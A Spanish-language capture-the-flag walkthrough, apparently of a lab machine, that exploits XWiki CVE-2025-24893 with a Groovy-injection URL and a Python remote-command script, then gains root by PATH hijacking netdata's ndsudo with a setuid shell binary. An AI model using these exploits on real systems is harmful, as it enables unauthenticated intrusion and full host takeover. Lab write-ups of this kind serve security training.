#### Vulnerabilidad CVE-2025-24893

Esta versión de XWiki es vulnerable a **CVE-2025-24893**, un fallo de manejo inadecuado de expresiones Groovy dentro de la macro `SolrSearch` que permite ejecución remota de comandos no autenticada:

```text

/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}}{{{{async async=false}}}}{{{{groovy}}}}"{command}".execute(){{{{/groovy}}}}{{{{/async}}}}
{% endraw %}
```

## Explotación

### PoC CVE-2025-24893

Podemos automatizar la ejecución remota apoyándonos en el siguiente script en Python adaptado para el endpoint de la máquina:

```python
import argparse
import requests
import re
from urllib.parse import urljoin, quote
import html

def exploit(url, cmd):
    headers = { "User-Agent": "Mozilla/5.0" }
    payload = "}}}" f"println('{cmd}'.execute().text)" ""
    encoded_payload = quote(payload)
    exploit_path = f"/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
    full_url = urljoin(url, exploit_path)

    try:
        response = requests.get(full_url, headers=headers, timeout=10)
        if response.status_code == 200:
            decoded = html.unescape(response.text)
            match = re.search(r"\[}}}(.*?)\]", decoded)
            if match:
                print("[+] Command Output:\n", match.group(1).strip())
            else:
                print("[*] Raw response:", response.text[:300])
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-c", "--cmd", required=True)
    args = parser.parse_args()
    exploit(args.url, args.cmd)
```

Obtenemos una reverse shell ejecutando el comando correspondiente hacia nuestra máquina atacante y ganando acceso con el usuario `xwiki`.

## Root (Privilege Escalation)

Revisando binarios con permisos especiales encontramos `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`. 

Al invocar `ndsudo nvme-list`, busca el binario `nvme` en las rutas del `$PATH`. Al no tener ruta absoluta fija, podemos realizar un **PATH Hijacking**.

Compilamos un binario malicioso que lance una shell con SUID:

```c
#include <unistd.h>

int main() {
    setuid(0); 
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

Compilamos y transferimos a `/tmp`:

```bash
oliver@editor:~$ chmod +x /tmp/nvme
oliver@editor:~$ export PATH=/tmp:$PATH
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
root@editor:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root),999(netdata),1000(oliver)
root@editor:/home/oliver# cat /root/root.txt
```
